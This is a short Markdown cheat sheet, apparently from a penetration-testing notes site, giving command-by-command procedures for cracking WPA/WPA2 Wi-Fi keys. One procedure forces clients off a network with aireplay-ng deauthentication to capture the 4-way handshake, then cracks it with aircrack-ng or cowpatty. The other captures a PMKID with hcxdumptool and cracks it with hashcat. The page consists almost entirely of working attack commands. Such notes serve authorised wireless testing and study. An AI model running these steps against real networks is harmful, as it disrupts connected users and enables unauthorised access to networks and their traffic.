---
title: WPA/WPA2
parent: Wireless Attack
layout: default
nav_order: 3
---

You can disable monitor mode anytime with `sudo airmon-ng stop wlan0mon`
If want to browse without GUI use `wget -qO- http://random`

## 4-Way Handshake

1. Monitor mode:\
   `sudo airmon-ng start wlan0`
2. Confirm it is in and get the interface name:\
   `iwconfig`
3. Start with this to find the network interested in:\
   `sudo airodump-ng wlan0mon --band abg`
4. Once you find it be specific on channel, also write it to file (optional to use `--bssid`):\
   `sudo airodump-ng wlan0mon -c 1 -w WPAfile`
5. Open ANOTHER TERMINAL and deauth a target: (a is AP, c is client)\
   `sudo aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0mon`
6. Should see WPA Handshake on airodump. (Optional) To ensure it is valid use:\
   `cowpatty -c -r WPAfile-01.cap`
7. Crack using aircrack:\
   `aircrack-ng -w /wordlist.txt -0 WPAfile-01.cap`
8. Crack directly using cowpatty with wordlist:\
   `cowpatty -r WPAfile-01.cap -f /wordlist.txt -s SSIDhere`


## PMKID Attack

1. Monitor mode:\
   `sudo airmon-ng start wlan0`
2. Confirm it is in and get the interface name:\
   `iwconfig`
3. Run this to ensure it is vulnerable: (should see PMKID for ESSID)\
   `hcxdumptool -i wlan0mon --enable_status=3`
4. Open NEW TERMINAL and run:\
   `airodump-ng wlan0mon --essid ESSIDNAMEHERE`
5. Again run this:\
   `hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=APBSSID --filtermode=2 -o TESTPMKID.pcap`
6. Convert it to a format hashcat can crack:\
   `hcxpcapngtool -o hash TESTPMKID.pcap`
7. Crack it with hashcat:\
   `hashcat -m 22000 --force hash /wordlist.txt`